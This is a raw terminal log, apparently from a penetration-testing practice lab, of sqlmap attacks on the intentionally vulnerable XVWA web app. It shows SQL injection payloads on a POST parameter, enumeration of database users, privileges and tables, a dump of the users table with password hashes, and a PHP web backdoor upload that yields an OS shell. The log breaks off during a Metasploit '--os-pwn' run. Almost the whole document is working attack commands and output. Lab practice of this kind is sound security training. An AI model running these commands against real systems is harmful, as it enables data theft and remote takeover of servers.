sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST --fingerprint
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.3#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:07:16 /2020-04-12/

[18:07:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[18:07:16] [INFO] testing connection to the target URL
Y
[18:07:26] [INFO] testing if the provided string is within the target URL page content
[18:07:26] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:07:26] [INFO] testing MySQL
[18:07:27] [INFO] confirming MySQL
[18:07:27] [INFO] the back-end DBMS is MySQL
[18:07:27] [INFO] actively fingerprinting MySQL
[18:07:28] [INFO] executing MySQL comment injection fingerprint
back-end DBMS: active fingerprint: MySQL >= 5.5
               comment injection fingerprint: MySQL 5.5.50
[18:07:28] [INFO] fetched data logged to text files under '/home/romw/.sqlmap/output/xvwa'

[*] ending @ 18:07:28 /2020-04-12/

sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST --current-user --current-db --is-dba 
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.3#stable}                                                                                                                                                           
|_ -| . [,]     | .'| . |                                                                                                                                                                          
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:12:38 /2020-04-12/

[18:12:38] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.8.1.14) Gecko/20080418 Firefox/2.0.0.14' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                                                                                                                          
[18:12:38] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=krf4abndbqi...buscqipd37'). Do you want to use those [Y/n] y
[18:12:44] [INFO] testing if the provided string is within the target URL page content
[18:12:44] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:12:44] [INFO] testing MySQL
[18:12:44] [INFO] confirming MySQL
[18:12:44] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[18:12:44] [INFO] fetching current user
[18:12:44] [INFO] retrieved: 'root@localhost'
current user: 'root@localhost'
[18:12:44] [INFO] fetching current database
[18:12:45] [INFO] retrieved: 'xvwa'
current database: 'xvwa'
[18:12:45] [INFO] testing if current user is DBA
[18:12:45] [INFO] fetching current user
current user is DBA: True
[18:12:45] [INFO] fetched data logged to text files under '/home/romw/.sqlmap/output/xvwa'

[*] ending @ 18:12:45 /2020-04-12/


sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST --users --passwords --privileges
        ___
       __H__                                                                                                                                                                                       
 ___ ___[.]_____ ___ ___  {1.4.3#stable}                                                                                                                                                           
|_ -| . [,]     | .'| . |                                                                                                                                                                          
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:17:12 /2020-04-12/

[18:17:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[18:17:12] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=i3p8qbotceg...p0geut2og4'). Do you want to use those [Y/n] y
[18:17:15] [INFO] testing if the provided string is within the target URL page content
[18:17:15] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:17:15] [INFO] testing MySQL
[18:17:15] [INFO] confirming MySQL
[18:17:16] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[18:17:16] [INFO] fetching database users
[18:17:16] [INFO] starting 10 threads
database management system users [5]:
[*] 'debian-sys-maint'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'localhost'
[*] 'root'@'xvwa'

[18:17:16] [INFO] fetching database users password hashes
[18:17:16] [INFO] starting 5 threads
[18:17:16] [INFO] resumed: 'root'
[18:17:16] [INFO] resumed: ''
[18:17:16] [INFO] resumed: 'debian-sys-maint'
[18:17:16] [INFO] resumed: ''
[18:17:16] [INFO] resumed: 'root'
[18:17:16] [INFO] resumed: 'root'
[18:17:16] [INFO] resumed: ''
[18:17:16] [INFO] resumed: ''
[18:17:16] [INFO] resumed: 'root'
[18:17:16] [INFO] resumed: ' '
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: NULL
[*] root [1]:
    password hash: NULL

[18:17:26] [INFO] fetching database users privileges
[18:17:26] [INFO] starting 10 threads
database management system users privileges:
[*] 'debian-sys-maint'@'localhost' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
[*] 'root'@'127.0.0.1' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
[*] 'root'@'::1' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
[*] 'root'@'localhost' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE
[*] 'root'@'xvwa' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE

[18:17:26] [INFO] fetched data logged to text files under '/home/romw/.sqlmap/output/xvwa'

[*] ending @ 18:17:26 /2020-04-12/

sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST --dbs
        ___
       __H__                                                                                                                                                                                       
 ___ ___[.]_____ ___ ___  {1.4.3#stable}                                                                                                                                                           
|_ -| . [(]     | .'| . |                                                                                                                                                                          
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:18:24 /2020-04-12/

[18:18:25] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.0.4) Gecko/2008111317 Ubuntu/8.04 (hardy) Firefox/3.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                                                                                                            
[18:18:25] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=fjfknl8ihll...cjnoq2a0o4'). Do you want to use those [Y/n] y
[18:18:28] [INFO] testing if the provided string is within the target URL page content
[18:18:28] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:18:28] [INFO] testing MySQL
[18:18:28] [INFO] confirming MySQL
[18:18:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[18:18:28] [INFO] fetching database names
[18:18:28] [INFO] starting 4 threads
[18:18:28] [INFO] resumed: 'information_schema'
[18:18:28] [INFO] resumed: 'mysql'
[18:18:28] [INFO] resumed: 'xvwa'
[18:18:28] [INFO] resumed: 'performance_schema'
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] xvwa

[18:18:28] [INFO] fetched data logged to text files under '/home/romw/.sqlmap/output/xvwa'

[*] ending @ 18:18:28 /2020-04-12/

sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST -D xvwa --tables --columns
        ___
       __H__                                                                                                                                                                                       
 ___ ___[)]_____ ___ ___  {1.4.3#stable}                                                                                                                                                           
|_ -| . [,]     | .'| . |                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:20:46 /2020-04-12/

[18:20:46] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                                                                                                                          
[18:20:46] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=2o7l4no6k4h...593gibcja5'). Do you want to use those [Y/n] y
[18:20:49] [INFO] testing if the provided string is within the target URL page content
[18:20:49] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:20:49] [INFO] testing MySQL
[18:20:49] [INFO] confirming MySQL
[18:20:49] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[18:20:49] [INFO] fetching tables for database: 'xvwa'
[18:20:49] [INFO] starting 3 threads
[18:20:49] [INFO] resumed: 'caffaine'
[18:20:49] [INFO] resumed: 'comments'
[18:20:49] [INFO] resumed: 'users'
Database: xvwa
[3 tables]
+----------+
| comments |
| caffaine |
| users    |
+----------+

[18:20:49] [INFO] fetching columns for table 'comments' in database 'xvwa'
[18:20:50] [INFO] starting 4 threads
[18:20:50] [INFO] retrieved: 'user'
[18:20:50] [INFO] retrieved: 'id'
[18:20:51] [INFO] retrieved: 'comment'
[18:20:51] [INFO] retrieved: 'date'
[18:20:51] [INFO] retrieved: 'varchar(30)'
[18:20:51] [INFO] retrieved: 'int(11)'
[18:20:51] [INFO] retrieved: 'varchar(30)'
[18:20:51] [INFO] retrieved: 'varchar(100)'
[18:20:51] [INFO] fetching columns for table 'caffaine' in database 'xvwa'
[18:20:51] [INFO] starting 7 threads
[18:20:51] [INFO] retrieved: 'itemid'
[18:20:51] [INFO] retrieved: 'itemcode'
[18:20:51] [INFO] retrieved: 'itemname'
[18:20:51] [INFO] retrieved: 'itemdisplay'
[18:20:51] [INFO] retrieved: 'int(11)'
[18:20:51] [INFO] retrieved: 'itemdesc'
[18:20:51] [INFO] retrieved: 'varchar(15)'
[18:20:51] [INFO] retrieved: 'categ'
[18:20:51] [INFO] retrieved: 'price'
[18:20:51] [INFO] retrieved: 'varchar(50)'
[18:20:51] [INFO] retrieved: 'varchar(500)'
[18:20:51] [INFO] retrieved: 'varchar(1000)'
[18:20:51] [INFO] retrieved: 'varchar(200)'
[18:20:51] [INFO] retrieved: 'varchar(20)'
[18:20:51] [INFO] fetching columns for table 'users' in database 'xvwa'
[18:20:51] [INFO] starting 3 threads
[18:20:51] [INFO] retrieved: 'uid'
[18:20:51] [INFO] retrieved: 'username'
[18:20:52] [INFO] retrieved: 'password'
[18:20:52] [INFO] retrieved: 'int(11)'
[18:20:52] [INFO] retrieved: 'varchar(50)'
[18:20:52] [INFO] retrieved: 'varchar(20)'
Database: xvwa
Table: comments
[4 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| comment | varchar(100) |
| date    | varchar(30)  |
| id      | int(11)      |
| user    | varchar(30)  |
+---------+--------------+

Database: xvwa
Table: caffaine
[7 columns]
+-------------+---------------+
| Column      | Type          |
+-------------+---------------+
| categ       | varchar(200)  |
| itemcode    | varchar(15)   |
| itemdesc    | varchar(1000) |
| itemdisplay | varchar(500)  |
| itemid      | int(11)       |
| itemname    | varchar(50)   |
| price       | varchar(20)   |
+-------------+---------------+

Database: xvwa
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(50) |
| uid      | int(11)     |
| username | varchar(20) |
+----------+-------------+

[18:20:52] [INFO] fetched data logged to text files under '/home/romw/.sqlmap/output/xvwa'

[*] ending @ 18:20:52 /2020-04-12/


sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST -D xvwa -T users --dump
        ___
       __H__                                                                                                                                                                                       
 ___ ___[)]_____ ___ ___  {1.4.3#stable}                                                                                                                                                           
|_ -| . [']     | .'| . |                                                                                                                                                                          
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:23:16 /2020-04-12/

[18:23:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071019 Fedora/2.0.0.8-1.fc7 Firefox/2.0.0.8' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                                                                                                        
[18:23:16] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=1qk7jkm8dui...23h3lttti1'). Do you want to use those [Y/n] y
[18:23:19] [INFO] testing if the provided string is within the target URL page content
[18:23:19] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:23:19] [INFO] testing MySQL
[18:23:19] [INFO] confirming MySQL
[18:23:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[18:23:20] [INFO] fetching columns for table 'users' in database 'xvwa'
[18:23:20] [INFO] starting 3 threads
[18:23:20] [INFO] resumed: 'uid'
[18:23:20] [INFO] resumed: 'int(11)'
[18:23:20] [INFO] resumed: 'password'
[18:23:20] [INFO] resumed: 'varchar(50)'
[18:23:20] [INFO] resumed: 'username'
[18:23:20] [INFO] resumed: 'varchar(20)'
[18:23:20] [INFO] fetching entries for table 'users' in database 'xvwa'
[18:23:20] [INFO] starting 3 threads
[18:23:20] [INFO] retrieved: '21232f297a57a5a743894a0e4a801fc3'
[18:23:21] [INFO] retrieved: '25890deab1075e916c06b9e1efc2e25f'
[18:23:21] [INFO] retrieved: '570992ec4b5ad7a313f5dc8fd0825395'
[18:23:21] [INFO] retrieved: '3'
[18:23:21] [INFO] retrieved: '2'
[18:23:21] [INFO] retrieved: '1'
[18:23:21] [INFO] retrieved: 'xvwa'
[18:23:21] [INFO] retrieved: 'user'
[18:23:21] [INFO] retrieved: 'admin'
[18:23:21] [INFO] recognized possible password hashes in column '`password`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[18:23:31] [INFO] writing hashes to a temporary file '/tmp/sqlmapwgkg8_yu5318/sqlmaphashes-o9b5llm1.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: xvwa
Table: users
[3 entries]
+-----+----------+----------------------------------+
| uid | username | password                         |
+-----+----------+----------------------------------+
| 1   | admin    | 21232f297a57a5a743894a0e4a801fc3 |
| 2   | xvwa     | 570992ec4b5ad7a313f5dc8fd0825395 |
| 3   | user     | 25890deab1075e916c06b9e1efc2e25f |
+-----+----------+----------------------------------+

[18:23:35] [INFO] table 'xvwa.users' dumped to CSV file '/home/romw/.sqlmap/output/xvwa/dump/xvwa/users.csv'
[18:23:35] [INFO] fetched data logged to text files under '/home/romw/.sqlmap/output/xvwa'

[*] ending @ 18:23:35 /2020-04-12/

romw@PentestServer3:~/Documentos/Pentesting/vulnhub/xvwa/2.-Pentest/2.-Http/Explotacion/1.-SqlInjection$ sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST --os-shell
        ___
       __H__                                                                                  
 ___ ___[)]_____ ___ ___  {1.4.3#stable}                                                      
|_ -| . [.]     | .'| . |                                                                     
|___|_  [(]_|_|_|__,|  _|                                                                     
      |_|V...       |_|   http://sqlmap.org                                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:46:42 /2020-04-12/

[18:46:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                           
[18:46:42] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=2l3qb5ghad0...qy
[18:46:50] [INFO] testing if the provided string is within the target URL page content
[18:46:51] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: item=1 OR ROW(5758,9704)>(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5758=5758,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8139 UNION SELECT 4366 UNION SELECT 9955 UNION SELECT 3786)a GROUP BY x)&search=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: item=1 AND (SELECT 8145 FROM (SELECT(SLEEP(5)))nIqY)&search=
---
[18:46:51] [INFO] testing MySQL
[18:46:51] [INFO] confirming MySQL
[18:46:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[18:46:51] [INFO] going to use a web backdoor for command prompt
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[18:47:02] [INFO] retrieved the web server document root: '/var/www'
[18:47:02] [INFO] retrieved web server absolute paths: '/var/www/html/xvwa/vulnerabilities/sqli/home.php'
[18:47:02] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:47:02] [WARNING] unable to upload the file stager on '/var/www/'
[18:47:02] [INFO] trying to upload the file stager on '/var/www/xvwa/vulnerabilities/sqli/' via LIMIT 'LINES TERMINATED BY' method
[18:47:02] [WARNING] unable to upload the file stager on '/var/www/xvwa/vulnerabilities/sqli/'
[18:47:02] [INFO] trying to upload the file stager on '/var/www/html/xvwa/vulnerabilities/sqli/' via LIMIT 'LINES TERMINATED BY' method
[18:47:02] [INFO] the file stager has been successfully uploaded on '/var/www/html/xvwa/vulnerabilities/sqli/' - http://xvwa:80/xvwa/vulnerabilities/sqli/tmpuqegz.php
[18:47:02] [INFO] the backdoor has been successfully uploaded on '/var/www/html/xvwa/vulnerabilities/sqli/' - http://xvwa:80/xvwa/vulnerabilities/sqli/tmpbdvzg.php
[18:47:02] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'www-data'
os-shell> 


sqlmap --threads=10 --level=5 --risk=3 --skip-waf --random-agent --host=xvwa --proxy=http://127.0.0.1:8080 --url=http://xvwa/xvwa/vulnerabilities/sqli/ --data="item=1&search=" -p item --string="0 or 1=1" --dbms=MYSQL --os=LINUX --method=POST --os-pwn
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.3#stable}                                                                                                                                                           
|_ -| . [,]     | .'| . |                                                                                                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:53:07 /2020-04-12/

[18:53:07] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.84 Safari/534.13' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                                                                                                                 
[18:53:07] [WARNING] you did not provide the local path where Metasploit Framework is installed
[18:53:07] [WARNING] sqlmap is going to look for Metasploit Framework installation inside the environment path(s)
[18:53:07] [INFO] Metasploit Framework has been found installed in the '/usr/bin' path
[18:53:07] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=v73b7bn8ie1...nunv4nokr4'). Do you want to use those [Y/n] y
[18:53:24] [INFO] testing if the provided string is within the target URL page content
[18:53:24] [WARNING] you provided '0 or 1=1' as the string to match, but such a string is not within the target URL raw response, sqlmap will carry on anyway
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
